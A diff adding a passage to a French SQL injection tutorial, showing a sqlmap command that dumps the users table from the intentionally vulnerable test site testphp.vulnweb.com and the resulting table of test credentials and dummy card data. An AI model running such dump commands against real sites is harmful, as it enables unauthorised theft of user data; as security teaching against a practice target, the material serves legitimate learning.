@@ -102,5 +102,24 @@ Table: users
 +---------+--------------+
 ```
 
+Maintenant, il ne nous reste plus qu'à afficher les données de la table :
 
+```text
+$ sudo sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dump -D acuart -T users
+```
+
+Résultat :
+
+```text
+Database: acuart
+Table: users
+[1 entry]
++---------------------+----------------------------------+--------------------------------------------------+------+-----------------+---------+-------+-----------+
+| cc                  | cart                             | name                                             | pass | email           | phone   | uname | address   |
++---------------------+----------------------------------+--------------------------------------------------+------+-----------------+---------+-------+-----------+
+| 1234-5678-2300-9000 | 5d85445a2a1e07611dfd51f20ef36758 | 1}"acxzzzzzzzzbbbccccdddeeexca".replace("z","o") | test | email@email.com | 2323345 | test  | 21 street |
++---------------------+----------------------------------+--------------------------------------------------+------+-----------------+---------+-------+-----------+
+```
+
+On peut donc voir que la table users contient un utilisateur dont l'identifiant et le mot de passe sont 'test'.
 
